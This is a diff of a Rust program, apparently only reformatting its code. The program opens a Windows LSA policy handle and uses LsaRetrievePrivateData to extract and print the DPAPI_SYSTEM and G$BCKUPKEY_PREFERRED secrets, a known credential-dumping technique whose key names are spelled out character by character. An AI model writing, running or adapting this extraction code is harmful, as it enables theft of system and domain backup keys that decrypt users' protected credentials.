@@ -74,13 +74,16 @@ fn hex_encode(data: &[u8]) -> alloc::string::String {
 }
 
 fn retrieve_key(handle: LsaHandle, name: &str, wide_name: &mut [u16]) {
-    let mut key_name = make_lsa_string(wide_name);
+    let key_name = make_lsa_string(wide_name);
     let mut private_data: *mut LsaUnicodeString = core::ptr::null_mut();
 
     let status = unsafe { LsaRetrievePrivateData(handle, &key_name, &mut private_data) };
 
     if status != STATUS_SUCCESS {
-        eprintln!("LsaRetrievePrivateData('{}') failed: NTSTATUS {:#X}", name, status as u32);
+        eprintln!(
+            "LsaRetrievePrivateData('{}') failed: NTSTATUS {:#X}",
+            name, status as u32
+        );
         return;
     }
 
@@ -133,17 +136,44 @@ fn main() {
     println!("  LSA policy handle opened.");
 
     let mut dpapi_system_wide: [u16; 13] = [
-        b'D' as u16, b'P' as u16, b'A' as u16, b'P' as u16, b'I' as u16, b'_' as u16,
-        b'S' as u16, b'Y' as u16, b'S' as u16, b'T' as u16, b'E' as u16, b'M' as u16,
+        b'D' as u16,
+        b'P' as u16,
+        b'A' as u16,
+        b'P' as u16,
+        b'I' as u16,
+        b'_' as u16,
+        b'S' as u16,
+        b'Y' as u16,
+        b'S' as u16,
+        b'T' as u16,
+        b'E' as u16,
+        b'M' as u16,
         0,
     ];
     retrieve_key(handle, "DPAPI_SYSTEM", &mut dpapi_system_wide);
 
     let mut bckupkey_wide: [u16; 21] = [
-        b'G' as u16, b'$' as u16, b'B' as u16, b'C' as u16, b'K' as u16, b'U' as u16,
-        b'P' as u16, b'K' as u16, b'E' as u16, b'Y' as u16, b'_' as u16, b'P' as u16,
-        b'R' as u16, b'E' as u16, b'F' as u16, b'E' as u16, b'R' as u16, b'R' as u16,
-        b'E' as u16, b'D' as u16, 0,
+        b'G' as u16,
+        b'$' as u16,
+        b'B' as u16,
+        b'C' as u16,
+        b'K' as u16,
+        b'U' as u16,
+        b'P' as u16,
+        b'K' as u16,
+        b'E' as u16,
+        b'Y' as u16,
+        b'_' as u16,
+        b'P' as u16,
+        b'R' as u16,
+        b'E' as u16,
+        b'F' as u16,
+        b'E' as u16,
+        b'R' as u16,
+        b'R' as u16,
+        b'E' as u16,
+        b'D' as u16,
+        0,
     ];
     retrieve_key(handle, "G$BCKUPKEY_PREFERRED", &mut bckupkey_wide);
 
